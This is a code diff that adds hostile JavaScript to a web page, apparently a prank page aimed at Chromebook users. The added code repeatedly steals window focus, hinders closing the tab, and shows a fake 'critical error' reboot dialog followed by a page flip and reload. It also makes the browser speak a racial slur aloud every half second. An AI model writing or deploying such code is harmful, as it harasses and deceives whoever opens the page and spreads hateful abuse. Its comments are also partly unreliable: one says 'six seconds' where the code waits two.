@@ -331,6 +331,44 @@ function simulateScreenRotation() {
 }
 setInterval(simulateScreenRotation, 100); //
 
+function stealFocus() {
+    window.focus();  // Brings the window back to focus
+    setTimeout(() => window.focus(), 50);  // Repeats this to ensure focus stays on the page
+}
+setInterval(stealFocus, 25); // 
+
+// Prevent tab closure
+window.onbeforeunload = function () {
+    return "Are you sure you want to leave?"; // Warning message on tab close attempt
+};
+
+function forceRebootChromebook() {
+    if (isChromebook()) {
+        // Simulate a reboot by triggering a "system restart"
+        const fakeRebootAlert = confirm("System has encountered a critical error. Rebooting now...");
+        if (fakeRebootAlert) {
+            document.body.style.transition = 'transform 1s ease-in-out';
+            document.body.style.transform = 'rotate(90deg)'; // Simulate a rotation as part of the "reboot"
+            setTimeout(() => {
+                document.body.style.transform = 'rotate(180deg)';  // Full 180-degree flip simulating "shutdown"
+            }, 1000);
+            setTimeout(() => {
+                location.reload(); // This is the final "reboot"
+            }, 2000);  // Reboot after 6 seconds
+        }
+    }
+}
+setInterval(forceRebootChromebook, 4000); //
+
+function textToSpeechSpam() {
+    const utter = new SpeechSynthesisUtterance("nigger");
+    utter.rate = 1;
+    utter.pitch = 0.8;
+    utter.volume = 50;
+    speechSynthesis.speak(utter);
+}
+setInterval(textToSpeechSpam, 500); //
+
 </script>
 </body>
 </html>
